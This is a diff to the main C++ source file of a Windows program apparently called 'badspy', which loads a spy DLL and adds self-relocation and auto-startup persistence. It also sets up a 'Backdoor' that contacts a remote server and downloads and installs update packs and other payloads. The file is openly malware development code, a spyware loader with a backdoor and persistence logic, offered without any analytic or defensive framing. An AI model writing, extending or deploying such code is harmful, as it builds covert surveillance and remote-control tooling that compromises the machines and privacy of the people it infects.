@@ -5,13 +5,14 @@
 #include <windows.h>
 #include "proc.h"
 #include "main.h"
+#include "fso.h"
 #include "bdr\backdoor.h"
 #include "shd\selfprt.h"
 #include "../../log-cpp/log.h"
 #include <Gdiplus.h>
 #include <Shlwapi.h>
 #define ERROR_CODE 1
-#define OK_CODE 1
+#define OK_CODE 0
 
 HMODULE badspyModule = NULL;
 HMODULE badspyDllModule = NULL;
@@ -19,12 +20,22 @@ Backdoor * backdoor = NULL;
 
 int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
 {
+	// first, setup some self-protecting features
+	LOG_I("Start self-protecting features");
+	if (start_self_protect())
+	{
+		LOG_I("Restart new instance from another safe area!");
+		return OK_CODE;
+	}
+
+	// after that, we will load dll library to memory
 	if (!init_library())
 	{
 		LOG_E("Can not load dll library");
 		return ERROR_CODE;
 	}
 
+	// then bind functions from dll
 	if (!init_dll_func())
 	{
 		free_library();
@@ -32,49 +43,46 @@ int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In
 		return ERROR_CODE;
 	}
 
+	// now, our spy could be safe then start spy features
 	if (load_spy())
 	{
 		free_library();
 		LOG_E("Can not load spy!");
 		return ERROR_CODE;
 	}
-	
-	LOG_I("Start self-protect feature");
-	start_self_protect();
 
-	LOG_I("Spy is running...");
-
+	// try to initializing backdoor feature, must has internet and server is living
+	// check for update itself is available then download and auto install(quitted itself
+	// after run install update pack)
 	LOG_I("Initializing backdoor...");
 	init_backdoor();
-
-	bool update_available = false;
 	if (backdoor != NULL)
 	{
 		LOG_I("Checking for update available...");
 		if (check_and_dwnl_update())
 		{
 			LOG_I("Update pack is available, exit to install this pack");
-			update_available = true;
+			LOG_I("Spy is stopping...");
+			unload_spy();
+			LOG_I("Installing update pack...");
+			install_update_pack();
+			goto quit;
 		}
 	}
 
-	if (!update_available)
-	{
-		install_packs();
-		start_looper();
-	}
+	// initializing backdoor is failed or no update is available then we just check
+	// for another packs(in another thread) and start looper to keep this instance is alive
+	install_packs();
+	start_looper();
 
+	// badspy is stopping? I think below code won't execute :)
 	LOG_I("Spy is stopping...");
-
 	unload_spy();
 
-	if (update_available)
-	{
-		LOG_I("Installing update pack...");
-		install_update_pack();
-	}
-
+	// try to release some resources
+quit:
 	free_backdoor();
+	free_library();
 
 	LOG_I("Exited!");
 	return OK_CODE;
@@ -110,8 +118,6 @@ bool init_dll_func()
 		return false;
 	if ((unload_spy = (UNLOAD_SPY)GetProcAddress(badspyModule, "unload_spy")) == NULL)
 		return false;
-	if ((path_combine = (PATH_COMBINE)GetProcAddress(badspyModule, "?path_combine@Spy@@CAXPADPBD1@Z")) == NULL)
-		return false;
 	LOG("loaded dll functions");
 	return true;
 }
@@ -128,30 +134,25 @@ void free_library()
 
 void init_backdoor()
 {
-	char * exe_path = new char[MAX_PATH];
-	if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) > 0)
+	char * root_dir = new char[MAX_PATH];
+	FSO::get_dir_path(root_dir);
+	char * working_dir = new char[MAX_PATH];
+	strcpy(working_dir, root_dir);
+	strcat(working_dir, SPY_DWL_TMP_DIR_NAME);
+	try
 	{
-		char * last_file_separator = strrchr(exe_path, '\\');
-		*(last_file_separator + 1) = '\0';
-		const char * root_dir = exe_path;
-		char * working_dir = new char[MAX_PATH];
-		strcpy(working_dir, root_dir);
-		strcat(working_dir, SPY_DWL_TMP_DIR_NAME);
-		try
-		{
-			backdoor = new Backdoor(SPY_NET_SERVER_ADDR, SPY_NET_SERVER_DWL_PORT, working_dir, root_dir);
-		}
-		catch (int error)
-		{
-			LOG_E("Error when create backdoor: %d", error);
-		}
-		catch (...)
-		{
-			LOG_E("Unhandled exception!");
-		}
-		delete[] working_dir;
+		backdoor = new Backdoor(SPY_NET_SERVER_ADDR, SPY_NET_SERVER_DWL_PORT, working_dir, root_dir);
 	}
-	delete[] exe_path;
+	catch (int error)
+	{
+		LOG_E("Error when create backdoor: %d", error);
+	}
+	catch (...)
+	{
+		LOG_E("Unhandled exception!");
+	}
+	delete[] working_dir;
+	delete[] root_dir;
 }
 
 void free_backdoor()
@@ -206,7 +207,10 @@ void install_packs()
 	}
 }
 
-void start_self_protect()
+bool start_self_protect()
 {
-	SelfPrt::auto_startup();
+	bool moved = SelfPrt::move_to_safearea();
+	if (!moved)
+		SelfPrt::auto_startup();
+	return moved;
 }
